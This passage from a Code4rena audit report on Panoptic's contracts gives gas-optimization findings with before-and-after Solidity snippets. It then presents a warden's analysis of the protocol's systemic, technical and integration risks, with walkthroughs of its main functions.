4. **Maintaining Functional Consistency**: The core functionality and safety checks of the function remain intact. The optimization does not alter the intended behavior of checking for overflow conditions but makes the process more efficient.

</details>

## [G-19] Avoid Unnecessary State Updates

[ERC1155Minimal.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/tokens/ERC1155Minimal.sol#L77)

Prevent unnecessary writes to the blockchain when the new state is the same as the existing state. This avoids the gas cost associated with state updates.

<details>

### Original Code

```solidity
function setApprovalForAll(address operator, bool approved) public {
    isApprovedForAll[msg.sender][operator] = approved;

    emit ApprovalForAll(msg.sender, operator, approved);
}
```

### Optimized Code

```solidity
function setApprovalForAll(address operator, bool approved) public {
    if (isApprovedForAll[msg.sender][operator] == approved) return;

    isApprovedForAll[msg.sender][operator] = approved;

    emit ApprovalForAll(msg.sender, operator, approved);
}
```

</details>

## [G-20] Use Short-Circuit Logic in Conditional Checks

ERC1155Minimal.sol [here](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/tokens/ERC1155Minimal.sol#L97) and [here](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/tokens/ERC1155Minimal.sol#L135).

Employing short-circuit logic can reduce gas usage, especially in conditional checks. In Solidity, logical expressions are evaluated from left to right, and evaluation stops as soon as the outcome is determined. This means if the first condition of an OR (`||`) expression is `true`, the second condition won't be checked, and vice versa for AND (`&&`) expressions.

<details>

### Original Code

```solidity
if (!(msg.sender == from || isApprovedForAll[from][msg.sender])) revert NotAuthorized();
```

### Optimized Code

```solidity
if (msg.sender != from && !isApprovedForAll[from][msg.sender]) revert NotAuthorized();
```

The optimized code uses an AND operation (`&&`) with negated conditions. It achieves the same logic but potentially saves gas since, if the first condition (`msg.sender != from`) is `true`, the second condition (`!isApprovedForAll[from][msg.sender]`) will not be evaluated.

</details>

## [G-21] Gas-Efficient Loops

[ERC1155Minimal.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/tokens/ERC1155Minimal.sol#L141)

Optimizing loop operations can significantly reduce gas consumption, especially in contracts with iterative processes over arrays or mappings. In Solidity, accessing the length of an array multiple times can be more costly than storing it in a local variable.

<details>

### Original Code

```solidity
for (uint256 i = 0; i < ids.length; ) {
    id = ids[i];
    amount = amounts[i];

    balanceOf[from][id] -= amount;
    unchecked {
        balanceOf[to][id] += amount;
    }
    unchecked {
        ++i;
    }
}
```

### Optimized Code

```solidity
uint256 length = ids.length;
for (uint256 i = 0; i < length; ) {
    id = ids[i];
    amount = amounts[i];

    balanceOf[from][id] -= amount;
    unchecked {
        balanceOf[to][id] += amount;
    }
    unchecked {
        ++i;
    }
}
```

</details>

Storing the `length` of the array in a local variable reduces the number of times the length property of the array is accessed, thus saving gas. This is especially beneficial in larger loops.

## [G-22] Minimize Redundant Computations in Functions

[Tokenid.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/types/TokenId.sol#L298)

Reducing redundant computations within functions, especially those called frequently, can result in significant gas savings. This involves identifying and eliminating calculations that are repeated unnecessarily.

<details>

### Original Code

In your provided source code, functions like `addLeg` perform multiple bitwise operations that might involve repeated calculations or similar patterns.

```solidity
function addLeg(
    uint256 self,
    uint256 legIndex,
    uint256 _optionRatio,
    uint256 _asset,
    uint256 _isLong,
    uint256 _tokenType,
    uint256 _riskPartner,
    int24 _strike,
    int24 _width
) internal pure returns (uint256 tokenId) {
    tokenId = addOptionRatio(self, _optionRatio, legIndex);
    tokenId = addAsset(tokenId, _asset, legIndex);
    tokenId = addIsLong(tokenId, _isLong, legIndex);
    tokenId = addTokenType(tokenId, _tokenType, legIndex);
    tokenId = addRiskPartner(tokenId, _riskPartner, legIndex);
    tokenId = addStrike(tokenId, _strike, legIndex);
    tokenId = addWidth(tokenId, _width, legIndex);
}
```

### Optimized Code

By refactoring the function to combine similar operations, you can reduce redundant computations:

```solidity
function addLegOptimized(
    uint256 self,
    uint256 legIndex,
    uint256 _optionRatio,
    uint256 _asset,
    uint256 _isLong,
    uint256 _tokenType,
    uint256 _riskPartner,
    int24 _strike,
    int24 _width
) internal pure returns (uint256) {
    uint256 legMask = (uint256(_asset % 2) << 0) |
                      (uint256(_optionRatio % 128) << 1) |
                      (uint256(_isLong % 2) << 8) |
                      (uint256(_tokenType % 2) << 9) |
                      (uint256(_riskPartner % 4) << 10) |
                      (uint256((int256(_strike) & BITMASK_INT24) << 12)) |
                      (uint256(uint24(_width) % 4096) << 36);

    return self | (legMask << (64 + legIndex * 48));
}
```

The optimized function combines all the bitwise operations related to a single leg into one statement, thereby reducing the number of operations. It uses a mask (`legMask`) to combine all leg-related data bits into a single `uint256` value, which is then merged into the original `tokenId` using a bitwise `OR`. This approach reduces the number of shifts and `OR` operations, potentially leading to gas savings.

</details>

## [G-23] Inefficient Loop Iterations in `_createPositionInAMM`

[SemiFungiablePositionManager.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/SemiFungiblePositionManager.sol#L848)

### Original Code

The original code in `_createPositionInAMM` involves looping through each leg of a token ID and performing operations on each. This can lead to repeated calculations or operations that could be optimized.

<details>

```solidity
function _createPositionInAMM(
    IUniswapV3Pool univ3pool,
    uint256 tokenId,
    uint128 positionSize,
    bool isBurn
) internal returns (int256 totalMoved, int256 totalCollected, int256 itmAmounts) {
    uint256 numLegs = tokenId.countLegs();
    for (uint256 leg = 0; leg < numLegs; ) {
        ...
        // Operations inside the loop
        ...
        unchecked {
            ++leg;
        }
    }
    ...
}
```

</details>

### Optimization

One way to optimize this is by caching repeated calculations or data fetches outside the loop. For example, if certain data from the `univ3pool` or `tokenId` is repeatedly used inside the loop, fetch it once outside the loop and use the cached value inside.

<details>

### Optimized Code

```solidity
function _createPositionInAMM(
    IUniswapV3Pool univ3pool,
    uint256 tokenId,
    uint128 positionSize,
    bool isBurn
) internal returns (int256 totalMoved, int256 totalCollected, int256 itmAmounts) {
    uint256 numLegs = tokenId.countLegs();
    
    // Example of caching data that might be used in each iteration
    TokenType tokenType = extractTokenType(tokenId); // Assuming this function exists and is used inside the loop.
    TickRange tickRange = extractTickRange(tokenId); // Assuming this function exists and is used inside the loop.

    for (uint256 leg = 0; leg < numLegs; ) {
        ...
        // Use cached `tokenType` and `tickRange` here instead of fetching/calculating them again.
        ...
        unchecked {
            ++leg;
        }
    }
    ...
}
```

In this optimized version, functions like `extractTokenType` and `extractTickRange` are hypothetical and represent any operation that might be repeatedly called within the loop. By fetching or calculating these values once and using them within the loop, we can reduce the computational overhead and thus save gas.

</details>

**[dyedm1 (Panoptic) confirmed](https://github.com/code-423n4/2023-11-panoptic-findings/issues/504#issuecomment-1859295117)**

***

# Audit Analysis

For this audit, 12 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-11-panoptic-findings/issues/244) by **Sathish9098** received the top score from the judge.

*The following wardens also submitted reports: [0xSmartContract](https://github.com/code-423n4/2023-11-panoptic-findings/issues/453), [catellatech](https://github.com/code-423n4/2023-11-panoptic-findings/issues/180), [0xHelium](https://github.com/code-423n4/2023-11-panoptic-findings/issues/71), [Bulletprime](https://github.com/code-423n4/2023-11-panoptic-findings/issues/601), [0xAadi](https://github.com/code-423n4/2023-11-panoptic-findings/issues/598), [tala7985](https://github.com/code-423n4/2023-11-panoptic-findings/issues/574), [Raihan](https://github.com/code-423n4/2023-11-panoptic-findings/issues/524), [K42](https://github.com/code-423n4/2023-11-panoptic-findings/issues/503), [fouzantanveer](https://github.com/code-423n4/2023-11-panoptic-findings/issues/258), [foxb868](https://github.com/code-423n4/2023-11-panoptic-findings/issues/243), and [ZanyBonzy](https://github.com/code-423n4/2023-11-panoptic-findings/issues/45).*

## Overview

Panoptic is a platform designed to facilitate effortless options trading on any crypto asset. It offers a comprehensive suite of tools for the decentralized finance (DeFi) community, accommodating a wide range of strategies and roles within the DeFi ecosystem. The platform enables users to trade any token, at any strike price, and of any size, without the need for intermediaries like banks, brokerage firms, clearinghouses, market makers, or centralized exchanges

## Systemic Risks

### Complexity in Position Management

- Handling multiple transaction legs increases the complexity of state management and transaction execution logic
- This standard allows for representing multiple token types within a single contract, adding complexity to tracking and managing these diverse assets.
- The intricate logic required for managing such diverse and multifaceted positions could lead to bugs, especially in edge cases or unexpected market conditions.
- The interaction of these complex positions with Uniswap's dynamic and variable liquidity pools might result in unforeseen outcomes, especially under high market volatility or liquidity changes.

### Liquidity Provision and Burn Mechanisms

The Liquidity Provision and Burn Mechanisms in the Panoptic protocol involve two distinct operations: minting typical Liquidity Provider (LP) positions and creating "long" positions by burning Uniswap liquidity. This dual approach presents risks.

- **Liquidity Imbalance**: Constantly changing liquidity due to frequent minting and burning can lead to imbalances, affecting price stability and the overall health of the liquidity pool.

- **Impact on Withdrawals**: Significant liquidity burning might reduce the pool's size, impacting other users' ability to withdraw their funds under favorable conditions.

### Interactions with Uniswap

The dependency of the Panoptic protocol on Uniswap's infrastructure and market dynamics as a risk factor.

- **Protocol Changes**: If Uniswap updates its protocol, these changes could impact how the Panoptic protocol interacts with Uniswap, potentially disrupting existing mechanisms.

- **Market Dynamics**: Uniswap's liquidity and price dynamics directly influence Panoptic's operations. Sudden market shifts on Uniswap, such as large trades or liquidity changes, could adversely affect Panoptic's performance and stability.

### ERC1155 Token Standards

The use of the ERC1155 standard in the Panoptic protocol introduces risks mainly due to its relative novelty and the complexity it brings.

- **Unexplored Vulnerabilities**: Being newer than ERC20, ERC1155 hasn't been as extensively tested in real-world scenarios, especially in complex DeFi environments. This could mean there are vulnerabilities that have not yet been discovered or addressed.

- **Complexity in DeFi Transactions**: ERC1155's ability to handle multiple asset types in a single contract adds complexity, which in a DeFi setting could lead to unforeseen issues in transaction handling, token tracking, and interoperability with other protocols or tokens.


## Technical Risks

### `PoolId` Collision Risks

```solidity
uint64 poolId = PanopticMath.getPoolId(univ3pool);

        while (address(s_poolContext[poolId].pool) != address(0)) {
            poolId = PanopticMath.getFinalPoolId(poolId, token0, token1, fee);
        }
        
function getFinalPoolId(
        uint64 basePoolId,
        address token0,
        address token1,
        uint24 fee
    ) internal pure returns (uint64) {
        unchecked {
            return
                basePoolId +
                (uint64(uint256(keccak256(abi.encodePacked(token0, token1, fee)))) >> 32);
        }
    } 
 ```

### Discussion
    
The method `getFinalPoolId` uses a hash of `token0`, `token1`, and `fee` to generate a pseudo-random number. This is added to the `basePoolId` to resolve collisions. While this is a creative solution to avoid collisions, it relies on pseudo-randomness. Pseudo-randomness in smart contracts, especially when derived from predictable variables like token addresses and fees, can be less reliable than true randomness and may be predictable to some extent.

### Efficiency Consideration

The method adds a computational overhead due to the hashing operation (keccak256). While this might not be significant for a single call, it could add up in scenarios where this function is called frequently.
The shift operation (`>> 32`) is relatively efficient, but the overall efficiency depends on how often collisions actually occur and how frequently this function needs to be called.

### Alternative Approaches

Consider using a simple mapping to track pool addresses and their associated data. This might be more straightforward and equally effective, especially if the collision risk is low.

## Risks Usage of Non Standard Higher-Order Bit as a Flag 

```solidity
unchecked {
            s_AddrToPoolIdData[univ3pool] = uint256(poolId) + 2 ** 255;
        }
```
### Discussion

This approach is non-standard and not immediately intuitive. Developers who are new to the codebase, or even those familiar with it, might not understand the purpose of the high-order bit without proper documentation. Misunderstanding how this flag works could lead to incorrect assumptions or misuse of the data.

When manipulating or reading `poolId` values, developers must remember to correctly handle the initialization flag. If they treat the entire uint256 value as a regular integer without accounting for the high-order bit, it could lead to incorrect calculations or logic errors

## Integration risks

### Integration of ITM Swapping

**Complexity of ITM Options**: In-the-money options are those where the current price of the underlying asset is favorable compared to the strike price of the option. In the context of liquidity pools and DeFi, managing ITM options involves handling a mix of assets (like `token0` and `token1` in Uniswap V3) within specific price ranges. This complexity increases the difficulty in accurately executing and managing these positions.

**Swapping for Balance Adjustment**: When an ITM option is executed, there might be a need to swap between the assets (`token0` and `token1`) to balance the position accurately. This involves interacting with the liquidity pool to execute a swap that aligns with the current state of the option. Ensuring this swap is done efficiently and accurately, without causing slippage or unfavorable rates, is challenging.

**Impact on Liquidity Pool**: Executing swaps for ITM options can have an impact on the liquidity pool, especially if the volume of the swap is significant compared to the pool's size. Large swaps could move the price, affect liquidity depth, or even trigger cascading trades, which might not be in the best interest of the liquidity providers or other traders in the pool.

**Precision and Timing**: The accuracy of executing these swaps is crucial. The timing and rate at which the swap occurs can significantly impact the profitability and risk profile of the option. Delays or inaccuracies could lead to less favorable conditions and potential losses.

### Integration of Complex Fee and Premium Calculation 

**Complex Fee Structure**: The contract handles the calculation of fees and premiums based on multiple factors like liquidity position, transaction size, and market conditions. The complexity of this fee structure increases the risk of calculation errors, which could lead to incorrect fee charges or premium distributions.

**High-Transaction-Volume Impact**: In scenarios with high transaction volumes, there's a risk that the contract may not accurately account for rapid changes in liquidity or price movements. This could result in outdated or incorrect fee calculations.

## Liquidity Pool Integration

**Market Condition Sensitivity**: Liquidity pools are highly sensitive to market conditions. During periods of high volatility or irregular market movements, the liquidity dynamics can change rapidly, affecting the stability and efficiency of the Panoptic protocol's interactions with these pools.

**Imbalanced Liquidity Provision and Removal**: The process of adding (minting) and removing (burning) liquidity needs to be well-managed to maintain pool health. Imbalances caused by excessive liquidity removal or provision could lead to adverse effects like price slippage, reduced pool efficiency, or increased impermanent loss risk for liquidity providers.

**Liquidity Pool Solvency Risks**: If the liquidity pools that Panoptic interacts with face solvency issues, it could endanger the positions managed by Panoptic. For instance, a significant decline in a pool's liquidity could impact the ability to execute trades or manage positions effectively.

## Software Engineering Considerations

**Smart Contract Modularity**: The contract encompasses diverse functionalities like liquidity management and ITM swapping. Refactoring to enhance modularity, where logical components are isolated (e.g., separate modules for ERC1155 handling, liquidity management, fee calculation), could improve maintainability and readability.

**Gas Optimization in Complex Functions**: Functions like `_validateAndForwardToAMM` and `_createLegInAMM` are complex and likely gas-intensive. Optimizing these by reducing state changes, using `memory` variables efficiently, and simplifying computations where possible is recommended.

**Security in Custom Reentrancy Guard**: The custom reentrancy guard logic should be thoroughly tested, especially for edge cases. Considering fallbacks or additional checks might enhance security.

**Robust Error Handling and Reversion Messages**: Given the contract's complexity, implementing detailed revert messages that provide clarity on the failure points would be beneficial for troubleshooting and user feedback.

**Testing for Edge Cases in Fee and Premium Calculations**: The fee and premium calculation mechanisms are intricate and thus prone to errors. Unit tests should cover a range of edge cases, including extreme market conditions and unusual liquidity scenarios.

**Integration Testing with Uniswap V3**: Since the contract interacts extensively with Uniswap V3, integration tests simulating real-world Uniswap interactions are crucial. This includes testing how the contract responds to changes in Uniswap's state (like liquidity shifts or price changes).

**Code Comments and Documentation**: Enhance inline documentation and code comments, especially in complex sections like premium calculations and liquidity chunk management, to aid future developers in understanding the contract's logic.

**Handling ERC1155 Specifics**: Given the use of ERC1155, ensure that the contract handles batch transfers, minting, and burning correctly and efficiently. This includes compatibility with wallets and interfaces that may primarily support ERC20 or ERC721.

**Upgrade and Maintenance Strategy**: If the contract is not upgradeable, having a clear strategy for migrating to a new version in case of significant updates or bug fixes is important. If it is upgradeable, ensure the security and integrity of the upgrade mechanism.

## Test Coverage

```
- What is the overall line coverage percentage provided by your tests?: `100`
```

As per the docs, the reported line coverage for your tests is 100% for the in-scope contracts, but there are other contracts not covered by these tests; it's important to extend your testing.

## Single Point of Failure Admin Risks

There is no single point of failures and admin risks because many functions not depend any of `Owners` and `Admins`. Most of the functions are external and public and open to any one call this.

## Architecture and Code Illustrations

### SemiFungiblePositionManager Contract

*Note: To review the diagram provided, please see the original submission [here](https://github.com/code-423n4/2023-11-panoptic-findings/issues/244).*

## Functions Illustrations

### `initializeAMMPool()`

This function initializes an Automated Market Maker (AMM) pool in a Panoptic protocol. Here's a concise explanation:

1. **Uni v3 Pool Address:** Computes the address of the Uniswap v3 pool for given tokens (`token0`, `token1`) and fee tier (`fee`).

2. **Initialization Check:** Reverts if the Uniswap v3 pool has not been initialized, indicating a potential error.

3. **Already Initialized Check:** Checks if the pool has already been initialized in the Panoptic protocol (`s_AddrToPoolIdData`). If so, returns, preventing duplicate initialization.

4. **Calculate PoolId:** Sets the base `poolId` as the last 8 bytes of the Uniswap v3 pool address. In case of a collision, it increments the `poolId` using a pseudo-random number.

5. **Unique PoolId Assignment:** Iteratively finds a unique `poolId` to avoid collisions with existing pools.

6. **Store Pool Information:** Stores the UniswapV3Pool and lock status in `s_poolContext` mapping using the calculated `poolId`.

7. **Store PoolId Information:** Records the UniswapV3Pool to `poolId` mapping in `s_AddrToPoolIdData` with a bit indicating initialization.

8. **Emit Initialization Event:** Emits an event signaling the successful initialization of the Uniswap v3 pool.

9. **Return and Assembly Block:** Returns from the function. Includes an assembly block that disables `memoryguard` during compilation, addressing size limit concerns for the contract.

This function initializes a Uniswap v3 pool, ensures uniqueness, and handles various checks for proper execution in the Panoptic protocol.

### `registerTokenTransfer()`

The internal function `registerTokenTransfer` facilitates the transfer of liquidity between accounts in a Uniswap v3 Automated Market Maker (AMM) pool within the Panoptic protocol:

1. **Extract Uniswap Pool:** Retrieves the Uniswap v3 pool from the `s_poolContext` mapping using the validated pool ID.

2. **Loop Through Legs:** Iterates through the legs of the pool to process liquidity transfers.

3. **Extract Liquidity Chunk:** Utilizes PanopticMath to extract a liquidity chunk, representing the liquidity amount and tick range.

4. **Construct Position Keys:** Forms unique position keys for the sender and recipient based on pool address, addresses, token types, and tick range.

5. **Revert Checks:** Reverts if the recipient already holds a position or if the balance transfer is incomplete.

6. **Update and Store:** Updates and stores liquidity and fee values between accounts, effectively transferring the liquidity.

This function ensures the secure transfer of liquidity and fee values within Uniswap v3 pools in the Panoptic protocol.

### `validateAndForwardToAMM()`

The internal function `_validateAndForwardToAMM` facilitates the validation and execution of position minting or burning within a Uniswap v3 Automated Market Maker (AMM) pool in the Panoptic protocol:

1. **Position Validation:** Reverts if the provided position size is zero, ensuring a non-zero balance.

2. **Flip Burn Token:** Adjusts the `tokenId` if it represents a burn operation by flipping the `isLong` bits.

3. **Uniswap Pool Extraction:** Retrieves the Uniswap v3 pool from the `s_poolContext` mapping based on the validated `tokenId`.

4. **Initialization Check:** Reverts if the Uniswap pool has not been previously initialized.

5. **Swap Configuration:** Determines whether a swap should occur at mint based on tick limits.

6. **Position Creation in AMM:** Calls `_createPositionInAMM` to loop through each leg of the `tokenId` and mints or burns liquidity in the Uniswap v3 pool.

7. **ITM Swap Check:** If in-the-money (ITM) amounts are non-zero and tick limits are inverted, swaps necessary amounts to address slippage.

8. **Current Tick Check:** Retrieves the current tick of the Uniswap pool and checks if it falls within specified tick limits, reverting if not.

9. **Return Values:** Returns the total collected from the AMM, total moved, and the new tick after the operation.

This function ensures the proper validation and execution of minting or burning positions in a Uniswap v3 pool, considering tick limits and potential swaps.

### `swapInAMM()`

The internal function `swapInAMM` conducts token swaps within a Uniswap v3 Automated Market Maker (AMM) pool in the Panoptic protocol:

1. **Initialization:** Initializes variables for swap direction, swap amount, and callback data.

2. **In-the-Money (ITM) Amount Unpacking:** Unpacks the positive and negative ITM amounts for `token0` and `token1`.

3. **Callback Data Struct Construction:** Constructs callback data containing pool features, such as `token0`, `token1`, and `fee`.

4. **Netting Swap:** Computes a single "netting" swap to address ITM amounts, considering `token0` and `token1` surpluses or shortages.

5. **Zero-For-One Determination:** Determines the direction of the swap (`token0` to `token1` or vice versa) based on the netting result.

6. **Swap Amount Calculation:** Computes the exact swap amount needed to address the net surplus or shortage.

7. **Token Swap Execution:** Executes the token swap in the Uniswap pool, triggering a callback function.

8. **Total Swapped Calculation:** Adds the amounts swapped to the `totalSwapped` variable, considering both `token0` and `token1`.

This function performs netting swaps to efficiently manage ITM amounts and executes token swaps in a Uniswap v3 pool, ensuring proper accounting of swapped quantities.

## Code WeakSpots

```solidity
function afterTokenTransfer(
        address from,
        address to,
        uint256[] memory ids,
        uint256[] memory amounts
    ) internal override {
        for (uint256 i = 0; i < ids.length; ) {
            registerTokenTransfer(from, to, ids[i], amounts[i]);
            unchecked {
                ++i;
            }
        }
    }
```

Uniswap V3 primarily operates with ERC20 tokens, which represent a single asset type per contract. ERC1155, on the other hand, supports both fungible and non-fungible tokens within a single contract. This fundamental difference in how these token standards operate can lead to complexities when integrating ERC1155 tokens with Uniswap V3's ERC20-focused mechanisms.

Managing liquidity for ERC1155 tokens within Uniswap V3 pools could introduce additional challenges. Since Uniswap V3 is designed around the liquidity dynamics of ERC20 tokens, accommodating the unique aspects of ERC1155 (like managing multiple token types in one contract) might complicate liquidity provision, withdrawal, and pricing.

```solidity
constructor(IUniswapV3Factory _factory) {
        FACTORY = _factory;
    }
```

Confirm that the `IUniswapV3Factory` interface in your codebase aligns with the actual ABI of the Uniswap V3 Factory. Any mismatch could result in failed transactions or incorrect behaviors.

```solidity
 modifier ReentrancyLock(uint64 poolId) {
        // check if the pool is already locked
        // init lock if not
        beginReentrancyLock(poolId);

        // execute function
        _;

        // remove lock
        endReentrancyLock(poolId);
    }

    /// @notice Add reentrancy lock on pool
    /// @dev reverts if the pool is already locked
    /// @param poolId The poolId of the pool to add the reentrancy lock to
    function beginReentrancyLock(uint64 poolId) internal {
        // check if the pool is already locked, if so, revert
        if (s_poolContext[poolId].locked) revert Errors.ReentrantCall();

        // activate lock
        s_poolContext[poolId].locked = true;
    }

    /// @notice Remove reentrancy lock on pool
    /// @param poolId The poolId of the pool to remove the reentrancy lock from
    function endReentrancyLock(uint64 poolId) internal {
        // gas refund is triggered here by returning the slot to its original value
        s_poolContext[poolId].locked = false;
    }
```

Custom implementations of security features like reentrancy guards are critical and can be potential points of failure.

### Time spent
20 hours

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
